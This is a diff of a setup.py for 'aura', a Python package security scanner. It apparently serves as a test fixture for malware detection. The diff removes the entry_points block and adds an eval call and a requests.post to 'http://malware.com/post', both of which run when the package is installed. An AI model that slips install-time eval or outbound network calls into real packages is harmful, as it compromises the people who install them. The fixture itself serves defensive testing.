@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-
+import requests
 from setuptools import setup
 
 with open("README.md", "r") as fd:
@@ -9,6 +9,8 @@ with open("README.md", "r") as fd:
 with open("requirements.txt", "r") as fd:
     reqs = fd.read().splitlines()
 
+eval('print("Hello malware")')
+requests.post("http://malware.com/post")
 
 setup(
     name='aura',
@@ -21,26 +23,6 @@ setup(
     url='https://github.com/RootLUG/aura',
     packages=['aura'],
     install_requires = reqs,
-    entry_points = {
-        'console_scripts': [
-            'aura = aura.cli:main',
-            'apip = aura.apip:main'
-        ],
-        'aura.analyzers': [
-            'sensitive_files = aura.analyzers.fs_struct:analyze_sensitive',
-            'suspicious_files = aura.analyzers.fs_struct:analyze_suspicious',
-            'yara = aura.analyzers.yara_scan:analyze',
-            'execution_flow = aura.analyzers.python.execution_flow:ExecutionFlow',
-            'setup_py = aura.analyzers.setup:SetupPy',
-            'data_finder = aura.analyzers.data_finder:DataFinder',
-            'wheel = aura.analyzers.wheel:analyze_wheel'
-        ],
-        'aura.uri_handlers': [
-            'pypi = aura.uri_handlers.pypi:PyPiHandler',
-            'mirror = aura.uri_handlers.mirror:MirrorHandler',
-            'local = aura.uri_handlers.local:LocalFileHandler'
-        ]
-    },
     classifiers=[
         "Development Status :: 3 - Alpha",
         "Intended Audience :: Developers",
